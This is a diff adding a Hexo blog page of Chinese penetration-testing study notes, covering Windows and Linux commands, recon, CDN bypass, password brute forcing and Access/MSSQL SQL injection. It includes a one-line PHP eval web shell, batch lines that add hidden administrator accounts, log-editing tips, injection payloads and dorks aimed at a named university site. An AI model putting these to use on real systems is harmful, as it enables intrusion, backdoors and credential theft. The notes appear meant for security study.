@@ -1,0 +1,767 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>study [实时更新] - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="/uploads/background.JPG"><div class="post-title"><h1 class="title">study [实时更新]</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>36 Minutes</li><li><i class="icon icon-calendar"></i>April 5, 2018</li></ul></div></div><div class="article-content" style="max-width:800px"><h1 id="study"><a href="#study" class="headerlink" title="study"></a><center>study</center></h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li>c:\system32\config\SAM <strong>存放系统账号和密码</strong> </li>
+<li>c:\system32\drivers\etc\hosts 本地域名解析文件</li>
+<li>用户家目录\可能会有一些程序的缓存信息，比如数据库连接 nvicat，QQ，浏览器 cookie，3389 连接等等，可以做一个本地信息收集。</li>
+</ul>
+<h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><ul>
+<li><p>win+R-&gt;service.msc 自动、手动、禁用、依赖关系。</p>
+</li>
+<li><p><strong>端口</strong>（信息收集，目标探测，服务判断，系统判断，系统角色分析）</p>
+<ul>
+<li>web 80 https 443 smb 445</li>
+<li>FTP 21 tftp 69</li>
+<li>ssh 22</li>
+<li>SMTP 25</li>
+<li>1-1024 系统预留一部分端口</li>
+<li>防火墙不能防木马病毒，但可以通过禁止特定端口限制回连，比如冰河默认链接端口是7626</li>
+</ul>
+</li>
+<li><p>注册表</p>
+<ul>
+<li><p>Windows 核心数据库</p>
+</li>
+<li><p>win+R-&gt;regeit</p>
+</li>
+<li><p>machine-&gt;SAM 存放登录信息</p>
+</li>
+<li><p>machine-&gt;software-&gt;microsoft-&gt;windows-&gt;currentversion-&gt;run 开机运行</p>
+<p>或 win+R-&gt;msconfig</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="DOS-命令"><a href="#DOS-命令" class="headerlink" title="DOS 命令"></a>DOS 命令</h3><ul>
+<li><p>cls 清屏</p>
+</li>
+<li><p>systeminfo 看是否打补丁，然后打开工具包利用提权</p>
+</li>
+<li><p>arp -a 看 arp 缓存表，来看内网有哪些主机</p>
+</li>
+<li><p>net view 查看局域网内其他计算机的名称</p>
+</li>
+<li><p>shutdown -s -t 180 -c “你被黑了”</p>
+</li>
+<li><p>dir 查看目录</p>
+</li>
+<li><p>copy con c:\abcd.txt</p>
+<?php @eval($_POST['muma']);?>
+
+<p>control + Z + enter 保存</p>
+<ul>
+<li>查看 notepad c:\abcd.txt    （记事本中打开）<ul>
+<li>type c:\abcd.txt （命令行中打开）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>删除文件 del c:\abcd.txt</p>
+</li>
+<li><p>md 123 新建目录</p>
+</li>
+<li><p>ren 1.txt 3.txt</p>
+</li>
+<li><p>copy 复制</p>
+</li>
+<li><p>move 移动</p>
+</li>
+<li><p>tree 树形查看目录结构</p>
+</li>
+<li><p>telnet 探测端口开放</p>
+</li>
+<li><p>映射盘符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k: \\192.168.0.105\c$ 映射盘符 把目标服务器c盘当成k映射出来 k:后要有空格</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>net start 看系统开了哪些服务</p>
+<p>net stop “windows search” 中止服务</p>
+</li>
+<li><p>net user 查看用户</p>
+<p>net user test 12345 /add 添加用户</p>
+<p>net user test 查看test用户</p>
+<p>net localgroup administrators test /add 添加test到管理员组</p>
+<p>net localgroup administrators 查看管理员组</p>
+<p>net user test 123.com 改密码</p>
+<p>net user test /del 删除用户</p>
+<p><strong>启用未激活的用户</strong></p>
+<p>net user guest 查看来宾用户</p>
+<p>net user guest /active:yes 激活来宾用户</p>
+<p>net user guest 123.com 设置密码</p>
+<p>net localgroup administrators guest /add 添加到管理员组</p>
+<p>net localgroup administrators guest /del 移出</p>
+<p>net user guest /active:no 禁用guest</p>
+</li>
+<li><p>net share 查看共享</p>
+<p>net share c$ /del 关闭共享</p>
+</li>
+<li><p>at 21:58 shutdown -s -t 180 设置计划任务</p>
+<p>at 查看计划任务列表</p>
+<p>at 1 /del</p>
+</li>
+<li><p>tasklist 进程</p>
+<p>taskkill /f /im notepad.exe 结束进程，但是无法结束杀软</p>
+</li>
+<li><p>建立一个批处理文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy con a.bat</span><br><span class="line">net user nick 123 /add</span><br><span class="line">net localgroup administrators nick /add</span><br><span class="line">ctrl+Z+enter</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>msg 用户名 发送信息</p>
+</li>
+</ul>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>LInux 可以运行 asp，但是比较麻烦</p>
+<h2 id="目录-1"><a href="#目录-1" class="headerlink" title="目录"></a>目录</h2><p>/bin binary 二进制文件，存放系统命令，ps，ls，ping等</p>
+<p>/sbin root权限才可以使用的一些命令，比如iptables，reboot，ifconfig，swapon等</p>
+<p>/etc 系统或程序的一些配置文件，也包含用于启动或停止单个程序的脚本，比如/etc/resolve.conf</p>
+<p>/dev Device Files 设备文件，包括终端设备，USB等，比如/dev/tty1，/dev/usbmon0</p>
+<p>/proc Process Information 进程信息，虚拟的文件系统，系统资源以文本信息形式存在</p>
+<p>/var variable files 变量文件，内容可能增长的文件，比如系统日志/var/log，数据库文件/var/lib，锁文件/var/lock，多次重新启动需要的临时文件/var/tmp</p>
+<p>/tmp 临时文件，当系统重新启动时，该目录下的文件都会被删除</p>
+<p>/usr 用户程序，比如从源安装apache，它会在/usr/local/apache2中，还有/usr/bin和/usr/sbin用到的库在/usr/lib中</p>
+<p>/home 用户家目录</p>
+<p>/boot 引导加载程序文件，Linux启动的核心文件，包含内核的initrd、vmlinux、grub等</p>
+<p>/lib system library 系统库，类似于Windows的.dll文件，包含支持位于/bin和/sbin下的二进制文件的库</p>
+<p>/opt optional add-on apps 可选的附加应用程序</p>
+<p>/mnt mount directory 临时挂载目录</p>
+<p>/media 可移动媒体设备，也可用来挂载</p>
+<p>/srv service data 包含服务器特定服务相关的数据</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
+<li><p>df 检查 linux 服务器文件系统磁盘空间占用情况</p>
+<p>-T 文件系统类型</p>
+</li>
+<li><p>mount 挂载 umount 卸载</p>
+</li>
+<li><p>$ 普通用户权限 # 管理员权限</p>
+</li>
+<li><p>⌃ + U 清空至行首，+ K 清空至行尾，+ L 清屏，\ + enter 强制换行</p>
+</li>
+<li><p>uname -r 查看内核版本号：<strong>提权第一步</strong></p>
+<p><a href="https://www.exploit-db.com" target="_blank" rel="noopener">https://www.exploit-db.com</a></p>
+<p>-n 详细查看</p>
+</li>
+<li><p>hostname <strong>可以判断计算机在网络中的身份</strong></p>
+</li>
+<li><p>cat /porc/cpuinfo cpu信息</p>
+</li>
+<li><p>cat /proc/meminfo  内存信息</p>
+</li>
+<li><p>drwxrwxrwx</p>
+<p>r-4 w-2 x-1</p>
+</li>
+<li><p>du 统计目录或文件占用空间情况 ° -sh /etc</p>
+</li>
+<li><p>mkdir -p a/b/c 递归创建目录</p>
+<p>ls -R 递归查看</p>
+</li>
+<li><p>touch * <strong>刷新时间</strong></p>
+</li>
+<li><p>copy -r 带目录复制 -rf 不带提示</p>
+</li>
+<li><p>find [查找范围] [查找条件]</p>
+<p>find / -name re*.conf</p>
+<p>find / -user nick</p>
+<p>find / -size</p>
+<p>find / -type</p>
+</li>
+<li><p><strong>vim 编辑器</strong></p>
+<ul>
+<li>设置行号 命令模式下 set nu</li>
+<li>a 光标后编辑，A 行尾编辑</li>
+<li>yy 复制 p 粘贴</li>
+<li>比如说要复制4行，先按4再按yy，然后p复制</li>
+<li>/install 查找，n下一个，N上一个</li>
+<li>?install 向上查找</li>
+<li>r 替换 R 整行替换<ul>
+<li>%s/.conf/php/g 全局替换，s 代表搜索，找到所有的 .conf 替换成 php，<strong>可以用于修改日志</strong></li>
+<li>750,760s/nick/aaa/g</li>
+<li>.,$d 光标所在位置删除到最后。. 代表光标位置 $ 表示最后</li>
+</ul>
+</li>
+<li>746 光标直接到 746 行</li>
+<li><strong>e! 恢复到刚打开的时候的状态</strong></li>
+</ul>
+</li>
+<li><p>wc 统计字符</p>
+</li>
+<li><p><strong>压缩</strong>  gzip/bzip2 -9 高度压缩</p>
+<ul>
+<li>gzip test.txt test.txt.gz 压缩</li>
+<li>gzip -d 解压</li>
+<li>bzip2 test.txt test.txt.bz2</li>
+<li>bzip2 -d 解压</li>
+</ul>
+</li>
+<li><p><strong>打包/归档</strong></p>
+<ul>
+<li>tar -cvf a.tar[生成文件名]    a.txt[要打包的文件名] </li>
+<li>tar -tvf a.tar 查看里面有哪些文件</li>
+<li>tar -rvf a.tar 追加</li>
+<li>tar -xvf a.tar 拆包</li>
+</ul>
+</li>
+<li><p>直接解压缩</p>
+<p>如果是gzip压缩            tar zxvf a.tar.gz</p>
+<p>如果是bzip2压缩            tar jxvf a.tar.bz2</p>
+</li>
+<li><p>rpm -ivh xxx 安装  i表示安装，vh表示详细信息</p>
+<p>rpm -qi 看软件包详细信息</p>
+<p>rpm -e xxx 卸载</p>
+</li>
+<li><p>setenforce 0 关闭 SELinux</p>
+</li>
+<li><p>useradd ab 添加系统账号 </p>
+<ul>
+<li>-u 指定uid     -d 指定家目录     -e 指定失效时间     -s 指定用户登录的shell</li>
+</ul>
+<p>passwd ab 设置密码</p>
+<p>userdel ab 删除用户ab</p>
+<ul>
+<li><p><strong>目录</strong></p>
+<ul>
+<li><p>/etc/passwd 记录用户</p>
+<p>格式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name:password:ID:group ID:comment:home directory:login shell</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">root 有密码 uID0 groupID0 root用户 家目录/root 可以登录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">mail 有密码 uID8 groupID12 mail 家目录 /var/spool/mail 不可登录</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>/etc/shadow 记录密码</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>netstat -tnlp tcp端口</p>
+<p>netstat -unlp udp端口</p>
+</li>
+<li><p>ps -aux 查看进程 或 top 动态查看</p>
+</li>
+</ul>
+<h2 id="Linux-配置"><a href="#Linux-配置" class="headerlink" title="Linux 配置"></a>Linux 配置</h2><h3 id="RedHat"><a href="#RedHat" class="headerlink" title="RedHat"></a>RedHat</h3><h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><figure class="highlight vim"><figcaption><span>/etc/sysconfig/network-scripts/ifcfg-eth0```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BOOTPROTO=dhcp/static</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">IPADDR=<span class="number">192.168</span>.<span class="number">1.2</span></span><br><span class="line"></span><br><span class="line">NETMASK=<span class="number">255.255</span>.<span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">GATEWAY=<span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">DNS=<span class="number">114.114</span>.<span class="number">114.114</span></span><br><span class="line"></span><br><span class="line">```重启网卡 service network restart</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务-1"><a href="#服务-1" class="headerlink" title="服务"></a>服务</h4><p>service *.service start/restart/status</p>
+<h3 id="CentOS-7"><a href="#CentOS-7" class="headerlink" title="CentOS 7"></a>CentOS 7</h3><h4 id="网络配置-1"><a href="#网络配置-1" class="headerlink" title="网络配置"></a>网络配置</h4><figure class="highlight plain"><figcaption><span>/etc/sysconfig/network-scripts```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 服务</span><br><span class="line"></span><br><span class="line">systemctl enable *.service		开机运行服务</span><br><span class="line"></span><br><span class="line">systemctl disable *.service		取消开机运行</span><br><span class="line"></span><br><span class="line">systemctl start *.service</span><br><span class="line"></span><br><span class="line">systemctl stop *.service</span><br><span class="line"></span><br><span class="line">systemctl restart *.service</span><br><span class="line"></span><br><span class="line">systemctl reload *.service 重新加载服务配置文件</span><br><span class="line"></span><br><span class="line">systemctl status *.service 状态</span><br><span class="line"></span><br><span class="line">### Ubuntu</span><br><span class="line"></span><br><span class="line">#### 网络配置</span><br><span class="line"></span><br><span class="line">```vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
+
+<p>auto eth0</p>
+<p>iface eth0 inet dhcp/static</p>
+<p>address 1.2.3.4</p>
+<p>gateway 1.2.3.4</p>
+<p>netmask 1.2.3.4</p>
+<figure class="highlight plain"><figcaption><span>/etc/init.d/networking restart```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```service networking restart</span><br></pre></td></tr></table></figure>
+
+<p>指定网卡重启   <figure class="highlight plain"><figcaption><span>eth0``` ```ifup eth0```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 服务</span><br><span class="line"></span><br><span class="line">service network restart/stop/status</span><br><span class="line"></span><br><span class="line">### Debian</span><br><span class="line"></span><br><span class="line">#### 网络配置</span><br><span class="line"></span><br><span class="line">```vim /etc/network/interfaces</span><br></pre></td></tr></table></figure></p>
+<p>auto eth0</p>
+<p>iface eth0 inet dhcp/static</p>
+<p>address 1.2.3.4</p>
+<p>gateway 1.2.3.4</p>
+<p>netmask 1.2.3.4</p>
+<figure class="highlight plain"><figcaption><span>/etc/init.d/networking restart```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 服务</span><br><span class="line"></span><br><span class="line">service network restart/stop/status</span><br><span class="line"></span><br><span class="line">## OSI 有哪几层</span><br><span class="line"></span><br><span class="line">7-应用层</span><br><span class="line"></span><br><span class="line">6-表示层									高层负责主机之间的数据传输</span><br><span class="line"></span><br><span class="line">5-会话层</span><br><span class="line"></span><br><span class="line">4-传输层</span><br><span class="line"></span><br><span class="line">3-网络层</span><br><span class="line"></span><br><span class="line">2-数据链路层							底层负责网络数据的传输</span><br><span class="line"></span><br><span class="line">1-物理层</span><br><span class="line"></span><br><span class="line">## TCP/IP 各个层次功能</span><br><span class="line"></span><br><span class="line">4-应用层				提供应用程序的网络接口			PDU</span><br><span class="line"></span><br><span class="line">3-传输层				建立端到端的连接						Segment</span><br><span class="line"></span><br><span class="line">2-网络层				寻址和路由选择							Packet</span><br><span class="line"></span><br><span class="line">1-数据链路层/物理层			物理介质访问、二进制比特流传输		Frame/Bit</span><br><span class="line"></span><br><span class="line">## 路由器作用</span><br><span class="line"></span><br><span class="line">- 做数据包转发</span><br><span class="line">- 隔绝广播域</span><br><span class="line"></span><br><span class="line">## 交换机</span><br><span class="line"></span><br><span class="line">- 局域网通信靠交换</span><br><span class="line"></span><br><span class="line">## 如何防御中间人攻击</span><br><span class="line"></span><br><span class="line">- 做双向 MAC 地址绑定（在路由器和终端上做）</span><br></pre></td></tr></table></figure>
+
+<p>  arp -s 192.168.0.1 00-11-ff-22-ss<br>  ```</p>
+<h2 id="html-基础"><a href="#html-基础" class="headerlink" title="html 基础"></a>html 基础</h2><ul>
+<li><p>常用的闭合标签，闭合之后才可以运行 XSS</p>
+<p>&lt;ol&gt;&lt;/ol&gt;</p>
+<p>&lt;il&gt;&lt;/li&gt;</p>
+</li>
+<li><p>表单标签&lt;form&gt;…&lt;/form&gt;</p>
+<ul>
+<li>属性 action：提交给哪个页面</li>
+<li>method：用什么方法提交</li>
+<li>target：目标</li>
+</ul>
+</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
+<li><p>域名信息</p>
+<ul>
+<li><p>查对应IP，TTL值，初步判断服务器系统，nslookup</p>
+</li>
+<li><p>收集子域名</p>
+<p>bbs.baidu.com</p>
+<p>edu.baidu.com</p>
+<p>可以从子域名开始挖掘漏洞，可能是旁站，真实 IP 可能也在子域名上。</p>
+<p>site:”edu.baidu.com”</p>
+<p>whois 查询<strong>注册人信息</strong>，站长工具或爱站网，微步在线。可以社工邮箱，手机号，钓鱼，撞库等等。通过邮箱查询还注册了其他哪些站点，</p>
+</li>
+</ul>
+</li>
+<li><p>敏感目录</p>
+<ul>
+<li>robots.txt：比较敏感：编辑器、管理后台等</li>
+<li>后台目录</li>
+<li>安装包：备份，里面有备份的网站，后台，目录等</li>
+<li>上传目录：fckeditor，ewebedit</li>
+<li>mysql管理接口：比如phpmyadmin，pmd，pma</li>
+<li>安装页面：install，install.php.lock，可能会暴露cms版本等</li>
+<li>phpinfo：php信息，指针，功能，根目录</li>
+<li>IIS 短文件</li>
+<li><strong>工具</strong>：御剑、爬行菜刀</li>
+</ul>
+</li>
+<li><p>端口扫描</p>
+<ul>
+<li>110-pop3 8080-tomcat/jboss 9090-websphere 443-ssl 445-smb</li>
+<li>工具：nmap、portscan、ntscan、telnet 如果不允许工具跑，可以用telnet</li>
+<li>看是否存在弱口令</li>
+</ul>
+</li>
+<li><p>旁站C段      旁站：同服务器上的其他站点     C段：同一网段其他服务器</p>
+<ul>
+<li><p>工具：web 》k8旁站、御剑1.5</p>
+<p>​            端口》portscan</p>
+</li>
+</ul>
+</li>
+<li><p>整站分析</p>
+<ul>
+<li><p>服务器系统</p>
+<p>Windows/linux</p>
+<ul>
+<li>通过后缀大小写测系统：Linux区分大小写</li>
+</ul>
+</li>
+<li><p>脚本格式</p>
+<p>asp/aspx/<strong>php</strong>/jsp</p>
+<ul>
+<li>通过后缀判断脚本格式</li>
+</ul>
+</li>
+<li><p>数据库类型</p>
+<p>access/mssql/mysql/oracle/db2/postgresql/sqlite</p>
+</li>
+<li><p>防护情况</p>
+<p>waf</p>
+<ul>
+<li>找一个id，加 and 1=1，返回正常一般有waf</li>
+</ul>
+</li>
+<li><p>CMS类型</p>
+<p>dedecms/empirecms/meterinfo/dz</p>
+<ul>
+<li>访问readme.txt，可能会有cms信息</li>
+</ul>
+</li>
+<li><p>容器判断</p>
+<p>抓响应包看server信息，或者使它报错</p>
+</li>
+</ul>
+</li>
+<li><p>谷歌hack</p>
+<ul>
+<li>intext:网页中含有关键字的</li>
+<li>intitle:标题</li>
+<li>filetype:</li>
+<li>inurl:asp?id=</li>
+<li>site:指定域名</li>
+</ul>
+</li>
+<li><p>URL采集</p>
+<ul>
+<li>采集相关URL的同类网站</li>
+</ul>
+</li>
+<li><p>后台查找</p>
+<ul>
+<li>弱口令默认后台<ul>
+<li>admin/login.asp/manage</li>
+</ul>
+</li>
+<li>页面底部可能会有管理链接</li>
+<li>有些图片的属性可能会链接到后台</li>
+<li>利用cms默认后台</li>
+<li>用工具查找</li>
+<li>robots.txt</li>
+<li>google hack</li>
+<li>yunsee.om</li>
+<li>短文件利用<ul>
+<li>a~!.asp 就可以访问到例如 administrator123.asp</li>
+<li>下载网站备份数据库时可以利用</li>
+</ul>
+</li>
+<li>sqlmap –sql-shell load_file(‘d:/wwwroot/index.php’);</li>
+</ul>
+</li>
+<li><p>信息分析</p>
+</li>
+</ul>
+<h2 id="CDN-绕过"><a href="#CDN-绕过" class="headerlink" title="CDN 绕过"></a>CDN 绕过</h2><h3 id="什么是-CDN？"><a href="#什么是-CDN？" class="headerlink" title="什么是 CDN？"></a>什么是 CDN？</h3><p>内容分发网络，用来加速</p>
+<p>爆破需要找到真实服务器，注入肯定是跟真实服务器做交互</p>
+<h3 id="如何探测是否有CDN？"><a href="#如何探测是否有CDN？" class="headerlink" title="如何探测是否有CDN？"></a>如何探测是否有CDN？</h3><p>用站长工具，ping测试，如果有多个IP，说明有cdn。</p>
+<h3 id="如何绕过？"><a href="#如何绕过？" class="headerlink" title="如何绕过？"></a>如何绕过？</h3><ul>
+<li>查找二级域名，一般CDN只会架在主域名上。</li>
+<li>让服务器主动给你发包，比如邮件，查看<strong>邮件原文</strong>。</li>
+<li>敏感文件泄露，比如phpinfo，infophp</li>
+<li>历史解析IP，ip138，查询历史IP。</li>
+<li>如果有App，抓包分析IP。</li>
+</ul>
+<h3 id="访问绕过CDN"><a href="#访问绕过CDN" class="headerlink" title="访问绕过CDN"></a>访问绕过CDN</h3><p>修改hosts文件，把找到的真实IP和域名绑定。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>nmap</strong></p>
+<ul>
+<li><p>主机探测</p>
+<ul>
+<li>nmap 192.168.0.1</li>
+<li>nmap 192.168.0.1/24</li>
+<li>nmap 192.168.0.1 192.168.0.101</li>
+<li>nmap 192.168.0.1-100</li>
+<li>nmap -iL scan.txt</li>
+</ul>
+</li>
+<li><p>端口扫描</p>
+<ul>
+<li>nmap -F -sT -v baidu.com F-100个最有可能开放的端口， sT 默认tcp，v现实详细信息</li>
+<li>-sS SYN扫描</li>
+</ul>
+</li>
+<li><p>-oN 导出扫描结果</p>
+<p>-oX 导出xml格式</p>
+</li>
+<li><p>-f 分片绕过</p>
+</li>
+<li><p>–source-port 原端口欺骗</p>
+</li>
+</ul>
+<h2 id="网站爆库漏洞"><a href="#网站爆库漏洞" class="headerlink" title="网站爆库漏洞"></a>网站爆库漏洞</h2><p>得到数据库地址 👉 将数据下载到本地 👉 找到管理员密码 👉 破解登录</p>
+<p>爆库，一般是ACCESS数据库，因为是以文件形式存在的。比如data.mdb</p>
+<p>如果是mssql/mysql，下载数据库连接文件，找到地址登录密码等。</p>
+<ul>
+<li>目录遍历（转到父目录）</li>
+<li>access记录连接信息的：访问Inc%5cconn.asp，可能会导致源代码泄露，暴露路径</li>
+<li>intext:to parent directory+intext:mdb site:xiyou.edu.cn// 指定站点 看是否有目录遍历</li>
+<li>::$data 泄露代码，或者可以直接下载</li>
+<li>如果有特殊符号，就进行url编码【mantraportable】</li>
+</ul>
+<h2 id="下载漏洞"><a href="#下载漏洞" class="headerlink" title="下载漏洞"></a>下载漏洞</h2><p>inurl:down.asp?FileName= site:xiyou.edu.cn</p>
+<p>指定站点尝试是否存在下载漏洞</p>
+<h2 id="常见cms后台"><a href="#常见cms后台" class="headerlink" title="常见cms后台"></a>常见cms后台</h2><p>织梦 dede</p>
+<p>discuz admin.php</p>
+<p>帝国 e/admin</p>
+<p>phpweb admin.php</p>
+<p>wordpress wp-admin</p>
+<p>aspcms admin</p>
+<p>科讯、南方、良精、ecshop admin</p>
+<p>常见：manage/login_admin/login_manage/houtai/denglu</p>
+<p>或者看看 robots.txt 使用说明.txt</p>
+<p>搜索 powered by aspcms 2.0</p>
+<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>工具：pkav httpfuzzer 针对有验证码的密码爆破</p>
+<ol>
+<li>burp抓包复制到pkav，复制请求站点</li>
+<li>添加标记，修改重放模式</li>
+<li>添加字典</li>
+<li>图片验证码识别，属性-地址，放到地址，识别，如果是纯数字则去掉字母，长度固定</li>
+<li>调线程，伪造x-forward-for</li>
+<li>重试规则，字符串匹配：验证码错误</li>
+<li>发包器发包</li>
+</ol>
+<h2 id="ACCESS-注入"><a href="#ACCESS-注入" class="headerlink" title="ACCESS 注入"></a>ACCESS 注入</h2><p>拿到代码一般就可以看到登录的密码</p>
+<p>测试是否有注入点，其实就是看是否有把提交的语句带入执行</p>
+<ul>
+<li><p>/，and1=1，and 1=2，-0</p>
+<p>但不是带入执行的语句都有注入</p>
+</li>
+<li><p><strong>判断数据库注入</strong></p>
+<p>and exists (select * from msysobjects)&gt;0 <strong>Access</strong></p>
+<p>and exists (select * from sysobjects)&gt;0 <strong>mssql</strong></p>
+<ul>
+<li><p>order by 3 测试有多少列</p>
+<ul>
+<li><p>and exists (select * from admin) 判断admin表是否存在，返回正常说明存在</p>
+</li>
+<li><p>判断列是否存在：and exists (select pass from admin)，返回正常说明存在</p>
+</li>
+<li><p>用union联合查询爆出</p>
+<p>union select 1,2,3 from admin</p>
+<p>union select admin,2,pass from admin</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>工具：穿山甲，sqlmap</p>
+</li>
+</ul>
+<h2 id="MSSQL-注入"><a href="#MSSQL-注入" class="headerlink" title="MSSQL 注入"></a>MSSQL 注入</h2><p>ASP，ASPX，一般是oa系统（在线办公系统），学校、棋牌游戏、政府、人事考试网站会碰到。</p>
+<p>0.0.0.0:<strong>1433</strong></p>
+<p>管理员账号：sa 权限很大，系统级，不能给sa设弱口令</p>
+<p>.mdf 数据库文件 / .ldf 数据库日志文件</p>
+<p><strong>dbID 用户从5开始，前4个预留给系统</strong></p>
+<p>如果想要删除数据库：</p>
+<ol>
+<li>首先分离：右键-任务-分离-勾选删除链接-确定</li>
+<li>进入数据库路径，然后删除.mdf和.ldf文件</li>
+</ol>
+<p>如果你的数据库版本是05，目标是08，怎么拖过来？</p>
+<p>右键-生成脚本-选择为哪个服务器版本编写的脚本-记得要勾选行为【携带数据】-勾选表-保存</p>
+<p><strong>安全名</strong> 可以创建新登录名，选择为哪个数据库创建的，涉及到权限问题。</p>
+<p><strong>服务器角色、用户映射</strong> 涉及到权限</p>
+<p>sa 权限最大：数据库操作、文件管理、命令执行、注册表读取等</p>
+<p>db 文件管理、数据库操作等 <strong>可以通过数据库备份来写shell</strong></p>
+<p>public 数据库操作 最多可以读取管理员账户和密码登后台，无法写shell</p>
+<p>常见连接配置文件名：</p>
+<p>asp: conn.asp,dbconfig.asp</p>
+<p>aspx: web.config</p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ol>
+<li><p>判断是否有注入</p>
+<p>and 1=1,and 1=2,/,-0</p>
+</li>
+<li><p>判断是否是 mssql</p>
+<p><strong>ACCESS</strong> and (select count(*) from msysobjects)&gt;0 返回正常说明是ACCESS数据库</p>
+<p><strong>MSSQL</strong> and (select (count(*) from sysobjects)&gt;0 返回正常说明是mssql数据库</p>
+</li>
+<li><p>测试权限（mssql 对应服务器角色）</p>
+<p>and 1=(select IS_SRVROLEMEMBER(‘sysadmin’));–</p>
